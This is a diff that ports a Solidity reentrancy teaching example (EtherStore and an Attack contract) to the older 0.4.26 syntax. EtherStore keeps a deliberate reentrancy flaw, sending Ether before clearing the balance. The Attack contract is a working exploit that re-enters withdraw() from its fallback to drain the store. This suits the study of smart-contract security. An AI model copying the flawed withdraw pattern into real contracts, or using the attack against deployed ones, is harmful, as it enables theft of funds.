@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.17;
+pragma solidity ^0.4.26;
 
 /*
 EtherStore is a contract where you can deposit and withdraw ETH.
@@ -39,7 +39,8 @@ contract EtherStore {
         uint bal = balances[msg.sender];
         require(bal > 0);
 
-        (bool sent, ) = msg.sender.call{value: bal}("");
+        //(bool sent, ) = msg.sender.call{value: bal}("");
+        bool sent = msg.sender.call.value(bal)("");
         require(sent, "Failed to send Ether");
 
         balances[msg.sender] = 0;
@@ -54,24 +55,21 @@ contract EtherStore {
 contract Attack {
     EtherStore public etherStore;
 
-    constructor(address _etherStoreAddress) {
+    constructor(address _etherStoreAddress) public {
         etherStore = EtherStore(_etherStoreAddress);
     }
 
     // Fallback is called when EtherStore sends Ether to this contract.
-    fallback() external payable {
+    function() public payable {
         if (address(etherStore).balance >= 1 ether) {
             etherStore.withdraw();
         }
     }
 
-    receive() external payable {
-        // handle received ether
-    }
-
-    function attack() external payable {
+    function attack() public payable {
         require(msg.value >= 1 ether);
-        etherStore.deposit{value: 1 ether}();
+
+        etherStore.deposit.value(1 ether)();
         etherStore.withdraw();
     }
 
